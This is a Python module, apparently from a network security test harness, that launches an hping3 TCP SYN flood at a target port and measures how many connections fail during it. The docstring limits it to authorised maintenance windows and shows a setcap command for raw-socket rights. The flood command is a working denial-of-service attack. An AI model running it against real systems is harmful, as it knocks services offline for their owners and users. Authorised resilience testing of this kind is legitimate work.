"""SYN Flood (DoS). Tests rate-limit / DoS protection against a TCP SYN flood —
a different limiter than the ICMP flood. hping3 SYN-floods an open service port
while TCP-connect success to that port is sampled; a high connect-failure rate
during the flood means the flood degraded service.

Requires root (hping3 raw socket) — grant once:
  sudo setcap cap_net_raw,cap_net_admin+eip $(which hping3)
Live, disruptive — only inside an authorised maintenance window. Linux only.
"""
import os
import socket
import subprocess
import time

FLOOD_SECONDS = 12
SYN_PORT = int(os.environ.get("HARNESS_SYN_PORT", "80"))
SAMPLES = 15
FAIL_THRESHOLD = 30   # % failed connects during the flood == real DoS impact

META = {
    "id": "syn_flood",
    "name": "SYN Flood (DoS)",
    "category": "Network Exploitation",
    "control": "Rate-limit / DoS protection (SYN)",
    "fix": "SD-WAN",
    "requires": ["hping3", "timeout"],
    "needs_root": True,           # hping3 needs a raw socket (root or CAP_NET_RAW)
    "os_supported": ["Linux"],
    "ports": [("tcp", SYN_PORT)],
    "success_regex": r"^PASS",
    # a privilege failure must NOT read as "control held" (flood never ran)
    "blocked_regex": r"^INFO|INCONCLUSIVE",
}

_PRIV_ERR = ("operation not permitted", "raw socket", "permission denied")


def _connect_ok(host, port, timeout=1.5):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


def run(target, ctx):
    out = [f"# SYN flood DoS vs {target}:{SYN_PORT}  "
           f"({FLOOD_SECONDS}s flood, {SAMPLES} connect samples)"]

    try:
        flood = subprocess.Popen(
            ["timeout", str(FLOOD_SECONDS), "hping3", "-S", "-p", str(SYN_PORT),
             "--flood", target],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    except FileNotFoundError:
        return "\n".join(out) + "\n[ERROR] hping3 not found (install hping3). INCONCLUSIVE"

    time.sleep(1)  # let the flood ramp before sampling
    fails = 0
    for _ in range(SAMPLES):
        if not _connect_ok(target, SYN_PORT):
            fails += 1
        time.sleep(0.3)

    try:
        fout, _ = flood.communicate(timeout=FLOOD_SECONDS + 5)
    except Exception:
        flood.kill()
        fout, _ = flood.communicate()

    if fout and any(m in fout.lower() for m in _PRIV_ERR):
        out.append(f"hping3 output: {fout.strip()[:200]}")
        out.append("FLOOD-PRIV-ERROR: hping3 could not open a raw socket (needs "
                   "root or CAP_NET_RAW) — the flood never ran. This is NOT "
                   "evidence the control works. Fix: sudo setcap "
                   "cap_net_raw,cap_net_admin+eip $(which hping3)")
        return "\n".join(out)

    loss = 100.0 * fails / SAMPLES
    if loss > FAIL_THRESHOLD:
        out.append(f"PASS: DoS effective — {loss:.0f}% of TCP connects to "
                   f"{SYN_PORT} failed during the flood")
    else:
        out.append(f"INFO: {loss:.0f}% connect failure (below {FAIL_THRESHOLD}% "
                   "threshold — control likely held)")
    return "\n".join(out)
